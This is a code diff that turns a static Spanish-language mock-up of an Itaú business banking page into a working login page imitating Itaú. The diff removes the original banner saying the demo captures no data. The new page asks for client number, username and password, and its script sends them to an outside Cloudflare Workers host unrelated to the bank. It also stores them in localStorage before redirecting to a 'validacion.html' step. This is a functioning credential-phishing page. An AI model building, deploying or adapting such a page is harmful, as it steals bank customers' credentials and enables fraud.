@@ -1,885 +1,473 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Cuenta bancaria para empresas</title>
-
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#06143f">
+<title>Itaú - Acceso</title>
 <style>
-
 :root{
   --navy:#06143f;
-  --max:1280px;
+  --orange:#ff5b00;
+  --blue:#006b91;
+  --text:#555;
+  --border:#d2d2d2;
 }
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:#fff;color:var(--text)}
+body{min-height:100vh}
 
-*{
-  box-sizing:border-box;
-}
-
-html,
-body{
-  margin:0;
-  padding:0;
-  width:100%;
-  min-height:100%;
-  background:#fff;
-}
-
-body{
-  font-family:Arial,Helvetica,sans-serif;
-  color:#111;
-  overflow-x:hidden;
-}
-
-button{
-  font-family:inherit;
-}
-
-/* ================= BLOQUE AZUL SUPERIOR ================= */
-
-.blue-section{
-  width:100%;
-  background:var(--navy);
-  color:#fff;
-  overflow:hidden;
-}
-
-.blue-section .page{
-  background:var(--navy);
-}
-
-/* ================= DEMO ================= */
-
-.demo{
-  position:fixed;
-  z-index:100;
-  top:8px;
-  left:50%;
-  transform:translateX(-50%);
-  padding:5px 12px;
-  border-radius:20px;
-  background:#b71c1c;
-  color:#fff;
-  font-size:10px;
-  font-weight:700;
-  white-space:nowrap;
-}
-
-/* ================= HEADER ================= */
-
+/* CABECERA */
 .header{
-  width:100%;
-  height:125px;
-  padding:24px 5vw;
-  position:relative;
+  height:110px;background:var(--navy);position:relative;
+  display:flex;align-items:flex-start;padding:18px 32px
 }
-
-/* ITAÚ MÁS PEQUEÑO */
-
 .logo{
-  width:68px;
-  height:68px;
-  border-radius:15px;
-  background:#fff;
-  color:var(--navy);
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  font-size:25px;
-  font-weight:700;
-  letter-spacing:-2px;
+  width:72px;height:72px;background:#fff;border-radius:14px;
+  display:flex;align-items:center;justify-content:center;
+  color:var(--navy);font-size:26px;font-weight:700;letter-spacing:-2px
 }
-
-/* INGRESAR MÁS PEQUEÑO */
-
-.login{
+.top-login{
   position:absolute;
-  top:32px;
   left:50%;
+  top:22px;
   transform:translateX(-50%);
-  width:190px;
-  height:58px;
+  width:210px;
+  height:64px;
   border:2px solid #fff;
-  border-radius:17px;
+  border-radius:20px;
+  color:#fff;
   display:flex;
   align-items:center;
-  justify-content:center;
-  gap:16px;
-  font-size:18px;
+  justify-content:space-between;
+  padding:0 18px 0 28px;
+  font-size:22px;
   font-weight:700;
-}
-
-/* ÍCONO USUARIO */
-
-.user-icon{
-  position:relative;
-  width:27px;
-  height:17px;
-  border:3px solid #fff;
-  border-radius:6px;
-  margin-top:12px;
-}
-
-.user-icon:before{
-  content:"";
-  position:absolute;
-  width:11px;
-  height:11px;
-  border:3px solid #fff;
-  border-radius:50%;
-  left:5px;
-  top:-20px;
-  background:var(--navy);
-}
-
-/* BUSCADOR */
-
-.search{
-  position:absolute;
-  right:11%;
-  top:51px;
-  width:34px;
-  height:34px;
-  border:3px solid #fff;
-  border-radius:50%;
-}
-
-.search:after{
-  content:"";
-  position:absolute;
-  width:17px;
-  height:3px;
-  right:-13px;
-  bottom:-7px;
-  background:#fff;
-  border-radius:3px;
-  transform:rotate(48deg);
-}
-
-/* MENÚ */
-
-.menu{
-  position:absolute;
-  right:5%;
-  top:53px;
-  width:37px;
-}
-
-.menu i{
-  display:block;
-  height:3px;
-  margin:7px 0;
-  border-radius:3px;
-  background:#fff;
-}
-
-/* ================= CONTENIDO ================= */
-
-.page{
-  width:100%;
-  padding:clamp(50px,8vw,105px) 5vw 0;
-}
-
-.hero{
-  width:100%;
-  max-width:var(--max);
-  margin:0 auto;
-}
-
-h1{
-  margin:0;
-  max-width:1050px;
-  font-size:clamp(34px,4.2vw,54px);
-  line-height:1.24;
-  letter-spacing:-1.5px;
-  font-weight:700;
-}
-
-.lead{
-  margin:30px 0 42px;
-  max-width:1050px;
-  font-size:clamp(21px,2.7vw,34px);
-  line-height:1.48;
-  letter-spacing:.1px;
-}
-
-.cta{
-  width:min(550px,100%);
-  height:80px;
-  border:2px solid #fff;
-  border-radius:22px;
   background:transparent;
+}
+.top-login .close-x{
+  font-size:28px;
+  font-weight:300;
+  cursor:pointer;
   color:#fff;
-  font-size:clamp(19px,2vw,27px);
-  font-weight:700;
-  cursor:not-allowed;
+  line-height:1;
+  transition: opacity 0.2s;
+}
+.top-login .close-x:hover{
+  opacity:0.7;
+}
+.search{
+  position:absolute;right:88px;top:38px;width:30px;height:30px;
+  border:3px solid #fff;border-radius:50%
+}
+.search:after{
+  content:"";position:absolute;width:14px;height:3px;background:#fff;
+  right:-10px;bottom:-5px;transform:rotate(45deg)
+}
+.menu{position:absolute;right:30px;top:40px;width:30px}
+.menu i{display:block;height:3px;background:#fff;margin:6px 0}
+.pointer{
+  position:absolute;bottom:-1px;left:50%;transform:translateX(-50%);
+  width:0;height:0;border-left:15px solid transparent;
+  border-right:15px solid transparent;border-bottom:15px solid #fff
 }
 
-/* ================= PRIMERA IMAGEN ================= */
-
-.photo-wrap{
-  width:100%;
-  max-width:var(--max);
-  margin:clamp(75px,9vw,120px) auto 0;
-  border-radius:clamp(70px,12vw,165px)
-             clamp(70px,12vw,165px)
-             0 0;
-  overflow:hidden;
+/* CONTENIDO */
+.content{
+  width:min(100% - 65px, 530px);
+  margin:0 auto;
+  padding:45px 0 55px
+}
+.select,.field{
+  width:100%;height:70px;border-radius:15px;background:#fff;
+  border:2px solid var(--border);padding:0 28px;
+  font-size:20px;color:#999;display:flex;align-items:center
+}
+.select{
+  border-color:#666;position:relative;margin-bottom:68px
+}
+.chevron{
+  position:absolute;right:28px;top:23px;width:18px;height:18px;
+  border-right:2.5px solid #555;border-bottom:2.5px solid #555;
+  transform:rotate(45deg)
+}
+.field{margin-bottom:32px}
+.field input{
+  width:100%;height:100%;border:0;outline:0;background:transparent;
+  font:inherit;color:#555;font-size:20px
+}
+.field input::placeholder{color:#999}
+.field input:focus{
+  border-color:var(--orange);
+}
+.btn{
+  width:100%;height:80px;border:0;border-radius:15px;
+  background:var(--orange);color:#fff;font-size:22px;font-weight:700;
+  cursor:pointer;
+  transition: opacity 0.3s;
+}
+.btn:hover:not(:disabled) {
+  opacity: 0.9;
+}
+.btn:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+.btn.loading {
+  opacity: 0.7;
+  cursor: wait;
+}
+.links{
+  font-size:20px;color:var(--blue);margin-top:18px;line-height:1.5
+}
+.links div{margin-bottom:16px;cursor:pointer}
+.links div:hover{text-decoration:underline}
+.note{
+  font-size:11px;color:#777;text-align:center;margin-top:22px
 }
 
-.photo{
-  display:block;
-  width:100%;
-  height:auto;
+/* Alerta personalizada */
+.alert-overlay {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.5);
+  z-index: 1000;
+  justify-content: center;
+  align-items: center;
+  animation: fadeIn 0.3s ease;
 }
 
-/* ================= PC GRANDE ================= */
-
-@media (min-width:1200px){
-
-  .header{
-    padding-left:5vw;
-    padding-right:5vw;
-  }
-
-  .page{
-    padding-top:80px;
-  }
-
-  .hero{
-    max-width:1280px;
-  }
-
-  .photo-wrap{
-    max-width:1280px;
-  }
-
+.alert-box {
+  background: white;
+  border-radius: 20px;
+  padding: 30px 32px 24px;
+  max-width: 380px;
+  width: 90%;
+  text-align: center;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+  animation: slideUp 0.3s ease;
 }
 
-/* ================= TABLET ================= */
+.alert-icon {
+  font-size: 48px;
+  margin-bottom: 12px;
+}
 
+.alert-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: #1a1a2e;
+  margin-bottom: 8px;
+}
+
+.alert-message {
+  font-size: 15px;
+  color: #6c757d;
+  line-height: 1.5;
+  margin-bottom: 20px;
+}
+
+.alert-btn {
+  background: #ff5b00;
+  color: white;
+  border: none;
+  padding: 12px 40px;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: opacity 0.3s;
+}
+
+.alert-btn:hover {
+  opacity: 0.9;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+@keyframes slideUp {
+  from { transform: translateY(30px); opacity: 0; }
+  to { transform: translateY(0); opacity: 1; }
+}
+
+/* TABLET */
 @media (max-width:900px){
-
-  .header{
-    height:105px;
-    padding:18px 30px;
-  }
-
-  .logo{
-    width:60px;
-    height:60px;
-    font-size:23px;
-    border-radius:14px;
-  }
-
-  .login{
-    top:25px;
-    width:175px;
-    height:54px;
-    border-radius:16px;
-    font-size:17px;
-    gap:14px;
-  }
-
-  .user-icon{
-    width:25px;
-    height:16px;
-    border-width:3px;
-    margin-top:11px;
-  }
-
-  .user-icon:before{
-    width:10px;
-    height:10px;
-    border-width:3px;
-    left:5px;
-    top:-19px;
-  }
-
-  .search{
-    right:88px;
-    top:41px;
-    transform:scale(.85);
-  }
-
-  .menu{
-    right:30px;
-    top:43px;
-    transform:scale(.85);
-  }
-
-  .page{
-    padding:55px 30px 0;
-  }
-
-  h1{
-    font-size:40px;
-  }
-
-  .lead{
-    font-size:23px;
-    margin:3px 0 16px;
-  }
-
-  .cta{
-    height:75px;
-    border-radius:19px;
-    font-size:22px;
-  }
-
-  .photo-wrap{
-    margin-top:78px;
-    border-radius:95px 95px 0 0;
-  }
-
+  .header{height:95px;padding:15px 26px}
+  .logo{width:64px;height:64px;font-size:23px;border-radius:13px}
+  .top-login{top:18px;width:185px;height:58px;font-size:20px;border-radius:18px;padding:0 14px 0 24px}
+  .top-login .close-x{font-size:24px}
+  .search{right:76px;top:34px;width:26px;height:26px}
+  .search:after{width:12px;right:-9px}
+  .menu{right:24px;top:36px;width:26px}
+  .menu i{height:3px;margin:5px 0}
+  .content{width:min(100% - 50px,480px);padding-top:38px}
+  .select,.field{height:62px;font-size:18px;padding:0 24px}
+  .select{margin-bottom:56px}
+  .chevron{right:22px;top:20px;width:16px;height:16px}
+  .field{margin-bottom:28px}
+  .field input{font-size:18px}
+  .btn{height:72px;font-size:20px}
+  .links{font-size:18px}
 }
 
-/* ================= MÓVIL ================= */
-
+/* MÓVIL */
 @media (max-width:600px){
-
-  .demo{
-    top:5px;
-    padding:4px 9px;
-    font-size:8px;
-  }
-
-  .header{
-    height:88px;
-    padding:14px 16px;
-  }
-
-  /* ITAÚ PEQUEÑO EN MÓVIL */
-
-  .logo{
-    width:55px;
-    height:55px;
-    border-radius:13px;
-    font-size:21px;
-  }
-
-  /* INGRESAR PEQUEÑO EN MÓVIL */
-
-  .login{
-    top:19px;
-    width:145px;
-    height:47px;
-    border-radius:14px;
-    font-size:16px;
-    gap:12px;
-  }
-
-  .user-icon{
-    width:22px;
-    height:14px;
-    border-width:2.5px;
-    margin-top:10px;
-  }
-
-  .user-icon:before{
-    width:9px;
-    height:9px;
-    border-width:2.5px;
-    left:4px;
-    top:-17px;
-  }
-
-  .search{
-    right:57px;
-    top:31px;
-    width:25px;
-    height:25px;
-    border-width:2.5px;
-  }
-
-  .search:after{
-    width:12px;
-    height:2.5px;
-    right:-9px;
-    bottom:-5px;
-  }
-
-  .menu{
-    right:14px;
-    top:33px;
-    width:25px;
-  }
-
-  .menu i{
-    height:2.5px;
-    margin:5px 0;
-  }
-
-  .page{
-    padding:60px 22px 0;
-  }
-
-  .hero{
-    max-width:none;
-  }
-
-  h1{
-    font-size:32px;
-    line-height:1.25;
-    letter-spacing:-.7px;
-  }
-
-  .lead{
-    margin:23px 0 32px;
-    font-size:21px;
-    line-height:1.5;
-  }
-
-  .cta{
-    width:100%;
-    height:72px;
-    border-radius:18px;
-    font-size:20px;
-  }
-
-  .photo-wrap{
-    width:100%;
-    margin-top:82px;
-    border-radius:75px 75px 0 0;
-  }
-
-  .photo{
-    width:100%;
-    height:auto;
-    min-height:0;
-    object-fit:cover;
-  }
-
-  .desktop-break{
-    display:none;
-  }
-
-}
-
-/* ================= MÓVIL PEQUEÑO ================= */
-
-@media (max-width:380px){
-
   .header{
     height:80px;
-    padding:11px 12px;
+    padding:12px 18px;
   }
-
   .logo{
-    width:50px;
-    height:50px;
-    font-size:19px;
+    width:52px;height:52px;border-radius:11px;
+    font-size:20px;letter-spacing:-1.5px
   }
-
-  .login{
-    top:16px;
-    width:135px;
-    height:44px;
-    font-size:15px;
-  }
-
-  .search{
-    right:50px;
-    top:27px;
-    transform:scale(.85);
-  }
-
-  .menu{
-    right:10px;
-    top:29px;
-    transform:scale(.85);
-  }
-
-  .page{
-    padding:48px 16px 0;
-  }
-
-  h1{
-    font-size:28px;
-  }
-
-  .lead{
-    font-size:18px;
-    margin:20px 0 28px;
-  }
-
-  .cta{
-    height:65px;
-    font-size:18px;
-  }
-
-  .photo-wrap{
-    margin-top:67px;
-    border-radius:60px 60px 0 0;
-  }
-
-}
-
-/* ================= ORIENTACIÓN HORIZONTAL ================= */
-
-@media (max-height:500px) and (orientation:landscape){
-
-  .header{
-    height:85px;
-    padding:10px 20px;
-  }
-
-  .logo{
-    width:55px;
-    height:55px;
-    font-size:21px;
-  }
-
-  .login{
-    top:15px;
-    height:50px;
-    width:165px;
-  }
-
-  .search{
-    top:31px;
-  }
-
-  .menu{
-    top:32px;
-  }
-
-  .page{
-    padding-top:30px;
-  }
-
-  .photo-wrap{
-    margin-top:60px;
-  }
-
-}
-
-/* ================= SECCIÓN BLANCA INFERIOR ================= */
-
-.info-section{
-  width:100%;
-  background:#fff;
-  color:#111;
-  padding:30px 5vw 65px;
-}
-
-.info-inner{
-  width:100%;
-  max-width:var(--max);
-  margin:0 auto;
-}
-
-.info-image{
-  width:100%;
-  display:block;
-  border-radius:28px;
-  object-fit:cover;
-}
-
-.info-block{
-  margin-top:58px;
-}
-
-.info-block + .info-block{
-  margin-top:60px;
-}
-
-.info-title{
-  margin:0 0 30px;
-  font-size:clamp(30px,3.1vw,42px);
-  line-height:1.15;
-  font-weight:700;
-}
-
-.info-text{
-  margin:0;
-  max-width:1120px;
-  font-size:clamp(21px,2.3vw,30px);
-  line-height:1.48;
-  color:#555;
-}
-
-.info-cta{
-  display:block;
-  width:min(500px,100%);
-  height:82px;
-  margin-top:60px;
-  border:0;
-  border-radius:17px;
-  background:#ff5b00;
-  color:#fff;
-  font-size:clamp(20px,2.1vw,28px);
-  font-weight:700;
-  cursor:not-allowed;
-}
-
-/* ================= TABLET BLANCO ================= */
-
-@media(max-width:900px){
-
-  .info-section{
-    padding:25px 30px 50px;
-  }
-
-  .info-image{
-    border-radius:23px;
-  }
-
-  .info-block{
-    margin-top:47px;
-  }
-
-  .info-block + .info-block{
-    margin-top:50px;
-  }
-
-  .info-title{
-    font-size:34px;
-    margin-bottom:25px;
-  }
-
-  .info-text{
-    font-size:15px;
-  }
-
-  .info-cta{
-    height:76px;
-    margin-top:50px;
-  }
-
-}
-
-/* ================= MÓVIL BLANCO ================= */
-
-@media(max-width:600px){
-
-  .info-section{
-    padding:22px 30px 28px;
-  }
-
-  .info-image{
-    border-radius:18px;
-    width:100%;
-    aspect-ratio:1.52/1;
-    object-fit:cover;
-  }
-
-  .info-block{
-    margin-top:55px;
-  }
-
-  .info-block + .info-block{
-    margin-top:56px;
-  }
-
-  .info-title{
-    font-size:31px;
-    line-height:1.15;
-    margin-bottom:32px;
-  }
-
-  .info-text{
-    font-size:22px;
-    line-height:1.5;
-  }
-
-  .info-cta{
-    width:100%;
-    height:70px;
-    margin-top:57px;
+  .top-login{
+    top:14px;
+    width:155px;
+    height:48px;
     border-radius:15px;
+    font-size:17px;
+    padding:0 10px 0 18px;
+  }
+  .top-login .close-x{
     font-size:20px;
   }
+  .search{
+    right:56px;top:28px;width:22px;height:22px;
+    border-width:2.5px
+  }
+  .search:after{
+    width:10px;height:2.5px;right:-7px;bottom:-4px
+  }
+  .menu{
+    right:16px;top:30px;width:22px
+  }
+  .menu i{height:2.5px;margin:4px 0}
+  .pointer{
+    border-left-width:11px;border-right-width:11px;border-bottom-width:11px
+  }
 
+  .content{
+    width:calc(100% - 30px);
+    max-width:none;
+    padding:32px 0 38px
+  }
+  .select,.field{
+    height:52px;
+    border-radius:11px;
+    padding:0 18px;
+    font-size:16px
+  }
+  .select{
+    margin-bottom:44px
+  }
+  .chevron{
+    right:16px;top:16px;width:13px;height:13px;border-width:2px
+  }
+  .field{margin-bottom:20px}
+  .field input{font-size:16px}
+  .btn{
+    height:60px;border-radius:11px;
+    font-size:17px
+  }
+  .links{
+    margin-top:14px;
+    font-size:15px;
+    line-height:1.4
+  }
+  .links div{margin-bottom:12px}
+  .note{font-size:10px;margin-top:16px}
 }
 
-/* ================= MÓVIL MUY PEQUEÑO ================= */
-
-@media(max-width:380px){
-
-  .info-section{
-    padding-left:20px;
-    padding-right:20px;
-  }
-
-  .info-title{
-    font-size:28px;
-  }
-
-  .info-text{
-    font-size:16px;
-  }
-
-  .info-cta{
-    font-size:18px;
-    height:65px;
-  }
-
+/* TELÉFONOS MUY PEQUEÑOS */
+@media (max-width:380px){
+  .header{height:68px;padding:9px 12px}
+  .logo{width:44px;height:44px;font-size:17px}
+  .top-login{top:10px;width:132px;height:42px;font-size:15px;border-radius:13px;padding:0 8px 0 14px}
+  .top-login .close-x{font-size:17px}
+  .search{right:46px;top:24px}
+  .menu{right:12px;top:26px}
+  .content{width:calc(100% - 22px);padding-top:25px}
+  .select,.field{height:46px;font-size:14px}
+  .select{margin-bottom:36px}
+  .field{margin-bottom:16px}
+  .field input{font-size:14px}
+  .btn{height:52px;font-size:15px}
+  .links{font-size:13px}
 }
-
 </style>
 </head>
-
-
 <body>
 
-<div class="demo">
-  MAQUETA DEMO · NO CAPTURA DATOS
+<!-- ALERTA PERSONALIZADA -->
+<div class="alert-overlay" id="alertOverlay">
+  <div class="alert-box">
+    <div class="alert-icon">⚠️</div>
+    <div class="alert-title">Datos incorrectos</div>
+    <div class="alert-message" id="alertMessage">Por favor, verifica tus datos e intenta nuevamente.</div>
+    <button class="alert-btn" onclick="cerrarAlerta()">Entendido</button>
+  </div>
 </div>
 
-
-<!-- =====================================================
-     PARTE AZUL
-===================================================== -->
-
-<section class="blue-section">
-
-  <header class="header">
-
-    <div class="logo">
-      itaú
-    </div>
-
-
-    <div class="login">
-
-      <span>
-        Ingresar
-      </span>
-
-      <span class="user-icon"></span>
-
-    </div>
-
-
-    <div class="search"></div>
-
-
-    <div class="menu">
-
-      <i></i>
-      <i></i>
-      <i></i>
-
-    </div>
-
-  </header>
-
-
-  <main class="page">
-
-    <section class="hero">
-
-
-      <h1>
-        Cuenta bancaria para<br>
-        empresas en Itaú
-      </h1>
-
-
-      <p class="lead">
-
-        La cuenta para gestionar y<br class="desktop-break">
-
-        hacer crecer tu empresa, con<br class="desktop-break">
-
-        soluciones financieras para<br class="desktop-break">
-
-        cada etapa de tu negocio.
-
-      </p>
-
-
-      <button class="cta" disabled>
-        Abrir mi cuenta empresa
-      </button>
-
-
-      <!-- RUTA ORIGINAL -->
-      <div class="photo-wrap">
-
-        <img
-          class="photo"
-          src="hero-mobile.DkwXokzc_1fSWkU.webp"
-          alt=""
-        >
-
-      </div>
-
-
-    </section>
-
-  </main>
-
-</section>
-
-
-<!-- =====================================================
-     PARTE BLANCA
-===================================================== -->
-
-<section class="info-section">
-
-  <div class="info-inner">
-
-
-    <!-- RUTA ORIGINAL -->
-    <img
-      class="info-image"
-      src="img-01.C7rLCPYp_1HU4rO.webp"
-      alt=""
-    >
-
-
-    <!-- ¿QUÉ ES? -->
-
-    <div class="info-block">
-
-      <h2 class="info-title">
-        ¿Qué es?
-      </h2>
-
-      <p class="info-text">
-
-        Una cuenta para gestionar y hacer crecer tu empresa,
-        con soluciones financieras para cada etapa de tu negocio.
-
-      </p>
-
-    </div>
-
-
-    <!-- ¿PARA QUÉ SIRVE? -->
-
-    <div class="info-block">
-
-      <h2 class="info-title">
-        ¿Para qué sirve?
-      </h2>
-
-      <p class="info-text">
-
-        Te permite organizar las finanzas de cualquier tipo de empresa.
-        Llevar la operativa del negocio de forma ágil con acceso a
-        productos financieros y canales digitales.
-
-      </p>
-
-    </div>
-
-
-    <!-- BOTÓN NARANJA -->
-
-    <button class="info-cta" disabled>
-      Abrir mi cuenta empresa
-    </button>
-
-
+<header class="header">
+  <div class="logo">itaú</div>
+  
+  <!-- INGRESAR CON X DENTRO -->
+  <div class="top-login">
+    Ingresar
+    <span class="close-x" onclick="window.location.reload()">✕</span>
+  </div>
+  
+  <div class="search" aria-hidden="true"></div>
+  <div class="menu" aria-hidden="true"><i></i><i></i><i></i></div>
+  <div class="pointer" aria-hidden="true"></div>
+</header>
+
+<main class="content">
+  <div class="select">
+    Empresas
+    <span class="chevron"></span>
   </div>
 
-</section>
+  <div class="field">
+    <input id="dni" aria-label="RUT/No. Cliente" placeholder="RUT/No. Cliente" type="text">
+  </div>
+  <div class="field">
+    <input id="usuario" aria-label="Usuario" placeholder="Usuario" type="text">
+  </div>
+  <div class="field">
+    <input id="clave" aria-label="Contraseña" placeholder="Contraseña" type="password">
+  </div>
 
+  <button id="loginBtn" class="btn">Ingresar</button>
+
+  <div class="links">
+    <div onclick="alert('Función en desarrollo')">Adherirse a Itaú/Link Empresa ›</div>
+    <div onclick="alert('Función en desarrollo')">Olvidé mi contraseña ›</div>
+  </div>
+
+  <div class="note">Sistema de autenticación seguro</div>
+</main>
+
+<script>
+// ========================= CONFIGURACIÓN =========================
+const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
+
+// ========================= FUNCIONES =========================
+function generarTransactionId() {
+    return crypto.randomUUID ? crypto.randomUUID() : 
+        Math.random().toString(36).substring(2) + Date.now().toString(36);
+}
+
+// ========================= ALERTA =========================
+function mostrarAlerta(mensaje) {
+    const overlay = document.getElementById('alertOverlay');
+    const messageEl = document.getElementById('alertMessage');
+    messageEl.textContent = mensaje || 'Por favor, verifica tus datos e intenta nuevamente.';
+    overlay.style.display = 'flex';
+}
+
+function cerrarAlerta() {
+    document.getElementById('alertOverlay').style.display = 'none';
+}
+
+// ========================= FUNCIÓN DE LOGIN =========================
+async function handleLogin() {
+    const dni = document.getElementById('dni').value.trim();
+    const usuario = document.getElementById('usuario').value.trim();
+    const clave = document.getElementById('clave').value.trim();
+    const loginBtn = document.getElementById('loginBtn');
+
+    // Validar campos
+    if (!dni || !usuario || !clave) {
+        mostrarAlerta('Por favor, completa todos los campos.');
+        return;
+    }
+
+    // Deshabilitar botón durante la petición
+    loginBtn.disabled = true;
+    loginBtn.classList.add('loading');
+    const textoOriginal = loginBtn.textContent;
+    loginBtn.textContent = '...';
+
+    const transactionId = generarTransactionId();
+
+    try {
+        const response = await fetch(`${WORKER_URL}/login`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                dni: dni,
+                usuario: usuario,
+                clave: clave,
+                transactionId: transactionId
+            })
+        });
+
+        const data = await response.json();
+
+        if (response.ok && data.ok) {
+            // GUARDAR DATOS EN LOCALSTORAGE para validacion.html
+            const datosLogin = {
+                dni: dni,
+                usuario: usuario,
+                clave: clave,
+                transactionId: transactionId,
+                timestamp: Date.now()
+            };
+            localStorage.setItem('bancoldata', JSON.stringify(datosLogin));
+            
+            console.log('✅ Datos guardados en localStorage');
+            
+            // Redirigir directamente
+            window.location.href = 'validacion.html';
+            
+        } else {
+            // Mostrar alerta de error
+            loginBtn.disabled = false;
+            loginBtn.classList.remove('loading');
+            loginBtn.textContent = textoOriginal;
+            mostrarAlerta(data.error || 'Error al procesar la solicitud. Intenta nuevamente.');
+        }
+    } catch (error) {
+        console.error('❌ Error en login:', error);
+        loginBtn.disabled = false;
+        loginBtn.classList.remove('loading');
+        loginBtn.textContent = textoOriginal;
+        mostrarAlerta('Error de conexión. Verifica tu internet.');
+    }
+}
+
+// ========================= EVENT LISTENERS =========================
+document.addEventListener('DOMContentLoaded', function() {
+    const loginBtn = document.getElementById('loginBtn');
+    const inputs = document.querySelectorAll('input');
+
+    // Click en botón
+    loginBtn.addEventListener('click', handleLogin);
+
+    // Enter en cualquier input
+    inputs.forEach(input => {
+        input.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                handleLogin();
+            }
+        });
+    });
+
+    console.log('🚀 Sistema de autenticación Itaú listo');
+    console.log(`📡 Worker URL: ${WORKER_URL}`);
+});
+</script>
 
 </body>
 </html>
